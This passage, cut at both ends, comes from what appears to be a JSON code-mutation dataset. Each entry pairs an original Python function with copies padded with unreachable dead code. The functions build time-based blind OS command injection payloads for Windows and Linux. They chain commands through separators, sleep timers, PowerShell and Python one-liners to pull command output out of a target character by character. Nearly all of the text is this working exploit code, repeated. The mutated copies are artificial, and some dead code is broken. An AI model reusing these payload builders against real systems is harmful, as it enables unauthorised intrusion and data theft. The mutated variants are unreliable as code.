\"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('$(echo $(\" + cmd + '))\\')\\nf.close()\\n\")' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.readline()))\")' + separator + 'if [ ' + str(j) + ' -ne ${str1} ] ' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('$(echo $(\" + cmd + '))\\')\\nf.close()\\n\")' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print len(file.readline())\") ' + separator + '[ ' + str(j) + ' -eq ${str1} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\") '\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('$(echo $(\" + cmd + '))\\')\\nf.close()\\n\")' + settings.SINGLE_WHITESPACE + '[ ' + str(j) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.readline()))\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload"
        ]
    },
    {
        "func_name": "get_char",
        "original": "def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none (Get-Content ' + OUTPUT_TEXTFILE + ').split(\" \")[' + str(num_of_chars - 1) + ']\"\\')' + settings.SINGLE_WHITESPACE + 'do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none (Get-Content ' + OUTPUT_TEXTFILE + ').split(\" \")[' + str(num_of_chars - 1) + ']\"\\')' + settings.SINGLE_WHITESPACE + 'do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    elif separator == ';' or separator == '%0a':\n        payload = separator + \"str=$(cut -d ' ' -f \" + str(num_of_chars) + ' < ' + OUTPUT_TEXTFILE + ')' + separator + 'if [ ' + str(ascii_char) + ' -ne ${str} ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n    elif separator == '&&':\n        separator = _urllib.parse.quote(separator)\n        ampersand = _urllib.parse.quote('&')\n        payload = ampersand + 'sleep 0' + separator + \"str=$(awk '{print$\" + str(num_of_chars) + \"}'<\" + OUTPUT_TEXTFILE + ')' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + 'sleep ' + str(timesec)\n        separator = _urllib.parse.unquote(separator)\n    elif separator == '||':\n        pipe = '|'\n        payload = pipe + '[ ' + str(ascii_char) + ' -ne $(cat ' + OUTPUT_TEXTFILE + pipe + \"tr -d '\\\\n'\" + pipe + 'cut -c ' + str(num_of_chars) + pipe + 'od -N 1 -i' + pipe + 'head -1' + pipe + \"awk '{print$2}') ] \" + separator + 'sleep ' + str(timesec)\n    else:\n        pass\n    return payload",
        "mutated": [
            "def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none (Get-Content ' + OUTPUT_TEXTFILE + ').split(\" \")[' + str(num_of_chars - 1) + ']\"\\')' + settings.SINGLE_WHITESPACE + 'do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none (Get-Content ' + OUTPUT_TEXTFILE + ').split(\" \")[' + str(num_of_chars - 1) + ']\"\\')' + settings.SINGLE_WHITESPACE + 'do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    elif separator == ';' or separator == '%0a':\n        payload = separator + \"str=$(cut -d ' ' -f \" + str(num_of_chars) + ' < ' + OUTPUT_TEXTFILE + ')' + separator + 'if [ ' + str(ascii_char) + ' -ne ${str} ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n    elif separator == '&&':\n        separator = _urllib.parse.quote(separator)\n        ampersand = _urllib.parse.quote('&')\n        payload = ampersand + 'sleep 0' + separator + \"str=$(awk '{print$\" + str(num_of_chars) + \"}'<\" + OUTPUT_TEXTFILE + ')' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + 'sleep ' + str(timesec)\n        separator = _urllib.parse.unquote(separator)\n    elif separator == '||':\n        pipe = '|'\n        payload = pipe + '[ ' + str(ascii_char) + ' -ne $(cat ' + OUTPUT_TEXTFILE + pipe + \"tr -d '\\\\n'\" + pipe + 'cut -c ' + str(num_of_chars) + pipe + 'od -N 1 -i' + pipe + 'head -1' + pipe + \"awk '{print$2}') ] \" + separator + 'sleep ' + str(timesec)\n    else:\n        pass\n    return payload",
            "def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none (Get-Content ' + OUTPUT_TEXTFILE + ').split(\" \")[' + str(num_of_chars - 1) + ']\"\\')' + settings.SINGLE_WHITESPACE + 'do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none (Get-Content ' + OUTPUT_TEXTFILE + ').split(\" \")[' + str(num_of_chars - 1) + ']\"\\')' + settings.SINGLE_WHITESPACE + 'do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    elif separator == ';' or separator == '%0a':\n        payload = separator + \"str=$(cut -d ' ' -f \" + str(num_of_chars) + ' < ' + OUTPUT_TEXTFILE + ')' + separator + 'if [ ' + str(ascii_char) + ' -ne ${str} ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n    elif separator == '&&':\n        separator = _urllib.parse.quote(separator)\n        ampersand = _urllib.parse.quote('&')\n        payload = ampersand + 'sleep 0' + separator + \"str=$(awk '{print$\" + str(num_of_chars) + \"}'<\" + OUTPUT_TEXTFILE + ')' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + 'sleep ' + str(timesec)\n        separator = _urllib.parse.unquote(separator)\n    elif separator == '||':\n        pipe = '|'\n        payload = pipe + '[ ' + str(ascii_char) + ' -ne $(cat ' + OUTPUT_TEXTFILE + pipe + \"tr -d '\\\\n'\" + pipe + 'cut -c ' + str(num_of_chars) + pipe + 'od -N 1 -i' + pipe + 'head -1' + pipe + \"awk '{print$2}') ] \" + separator + 'sleep ' + str(timesec)\n    else:\n        pass\n    return payload",
            "def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none (Get-Content ' + OUTPUT_TEXTFILE + ').split(\" \")[' + str(num_of_chars - 1) + ']\"\\')' + settings.SINGLE_WHITESPACE + 'do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none (Get-Content ' + OUTPUT_TEXTFILE + ').split(\" \")[' + str(num_of_chars - 1) + ']\"\\')' + settings.SINGLE_WHITESPACE + 'do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    elif separator == ';' or separator == '%0a':\n        payload = separator + \"str=$(cut -d ' ' -f \" + str(num_of_chars) + ' < ' + OUTPUT_TEXTFILE + ')' + separator + 'if [ ' + str(ascii_char) + ' -ne ${str} ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n    elif separator == '&&':\n        separator = _urllib.parse.quote(separator)\n        ampersand = _urllib.parse.quote('&')\n        payload = ampersand + 'sleep 0' + separator + \"str=$(awk '{print$\" + str(num_of_chars) + \"}'<\" + OUTPUT_TEXTFILE + ')' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + 'sleep ' + str(timesec)\n        separator = _urllib.parse.unquote(separator)\n    elif separator == '||':\n        pipe = '|'\n        payload = pipe + '[ ' + str(ascii_char) + ' -ne $(cat ' + OUTPUT_TEXTFILE + pipe + \"tr -d '\\\\n'\" + pipe + 'cut -c ' + str(num_of_chars) + pipe + 'od -N 1 -i' + pipe + 'head -1' + pipe + \"awk '{print$2}') ] \" + separator + 'sleep ' + str(timesec)\n    else:\n        pass\n    return payload",
            "def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none (Get-Content ' + OUTPUT_TEXTFILE + ').split(\" \")[' + str(num_of_chars - 1) + ']\"\\')' + settings.SINGLE_WHITESPACE + 'do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none (Get-Content ' + OUTPUT_TEXTFILE + ').split(\" \")[' + str(num_of_chars - 1) + ']\"\\')' + settings.SINGLE_WHITESPACE + 'do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    elif separator == ';' or separator == '%0a':\n        payload = separator + \"str=$(cut -d ' ' -f \" + str(num_of_chars) + ' < ' + OUTPUT_TEXTFILE + ')' + separator + 'if [ ' + str(ascii_char) + ' -ne ${str} ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n    elif separator == '&&':\n        separator = _urllib.parse.quote(separator)\n        ampersand = _urllib.parse.quote('&')\n        payload = ampersand + 'sleep 0' + separator + \"str=$(awk '{print$\" + str(num_of_chars) + \"}'<\" + OUTPUT_TEXTFILE + ')' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + 'sleep ' + str(timesec)\n        separator = _urllib.parse.unquote(separator)\n    elif separator == '||':\n        pipe = '|'\n        payload = pipe + '[ ' + str(ascii_char) + ' -ne $(cat ' + OUTPUT_TEXTFILE + pipe + \"tr -d '\\\\n'\" + pipe + 'cut -c ' + str(num_of_chars) + pipe + 'od -N 1 -i' + pipe + 'head -1' + pipe + \"awk '{print$2}') ] \" + separator + 'sleep ' + str(timesec)\n    else:\n        pass\n    return payload",
            "def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none (Get-Content ' + OUTPUT_TEXTFILE + ').split(\" \")[' + str(num_of_chars - 1) + ']\"\\')' + settings.SINGLE_WHITESPACE + 'do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none (Get-Content ' + OUTPUT_TEXTFILE + ').split(\" \")[' + str(num_of_chars - 1) + ']\"\\')' + settings.SINGLE_WHITESPACE + 'do if %i==' + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    elif separator == ';' or separator == '%0a':\n        payload = separator + \"str=$(cut -d ' ' -f \" + str(num_of_chars) + ' < ' + OUTPUT_TEXTFILE + ')' + separator + 'if [ ' + str(ascii_char) + ' -ne ${str} ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n    elif separator == '&&':\n        separator = _urllib.parse.quote(separator)\n        ampersand = _urllib.parse.quote('&')\n        payload = ampersand + 'sleep 0' + separator + \"str=$(awk '{print$\" + str(num_of_chars) + \"}'<\" + OUTPUT_TEXTFILE + ')' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + 'sleep ' + str(timesec)\n        separator = _urllib.parse.unquote(separator)\n    elif separator == '||':\n        pipe = '|'\n        payload = pipe + '[ ' + str(ascii_char) + ' -ne $(cat ' + OUTPUT_TEXTFILE + pipe + \"tr -d '\\\\n'\" + pipe + 'cut -c ' + str(num_of_chars) + pipe + 'od -N 1 -i' + pipe + 'head -1' + pipe + \"awk '{print$2}') ] \" + separator + 'sleep ' + str(timesec)\n    else:\n        pass\n    return payload"
        ]
    },
    {
        "func_name": "get_char_alter_shell",
        "original": "def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"with open(r\\'' + OUTPUT_TEXTFILE + \"') as file: print(ord(file.read().strip()[\" + str(num_of_chars - 1) + '][0])); exit(0)\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(ord(file.readlines()[0][\" + str(num_of_chars - 1) + ']))\\nexit(0)\")' + separator + 'if [ ' + str(ascii_char) + ' -ne ${str} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(ord(file.readlines()[0][\" + str(num_of_chars - 1) + ']))\\nexit(0)\")' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(ascii_char) + ' -ne  $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(ord(file.readlines()[0][\" + str(num_of_chars - 1) + ']))\\nexit(0)\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
        "mutated": [
            "def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"with open(r\\'' + OUTPUT_TEXTFILE + \"') as file: print(ord(file.read().strip()[\" + str(num_of_chars - 1) + '][0])); exit(0)\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(ord(file.readlines()[0][\" + str(num_of_chars - 1) + ']))\\nexit(0)\")' + separator + 'if [ ' + str(ascii_char) + ' -ne ${str} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(ord(file.readlines()[0][\" + str(num_of_chars - 1) + ']))\\nexit(0)\")' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(ascii_char) + ' -ne  $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(ord(file.readlines()[0][\" + str(num_of_chars - 1) + ']))\\nexit(0)\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"with open(r\\'' + OUTPUT_TEXTFILE + \"') as file: print(ord(file.read().strip()[\" + str(num_of_chars - 1) + '][0])); exit(0)\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(ord(file.readlines()[0][\" + str(num_of_chars - 1) + ']))\\nexit(0)\")' + separator + 'if [ ' + str(ascii_char) + ' -ne ${str} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(ord(file.readlines()[0][\" + str(num_of_chars - 1) + ']))\\nexit(0)\")' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(ascii_char) + ' -ne  $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(ord(file.readlines()[0][\" + str(num_of_chars - 1) + ']))\\nexit(0)\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"with open(r\\'' + OUTPUT_TEXTFILE + \"') as file: print(ord(file.read().strip()[\" + str(num_of_chars - 1) + '][0])); exit(0)\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(ord(file.readlines()[0][\" + str(num_of_chars - 1) + ']))\\nexit(0)\")' + separator + 'if [ ' + str(ascii_char) + ' -ne ${str} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(ord(file.readlines()[0][\" + str(num_of_chars - 1) + ']))\\nexit(0)\")' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = 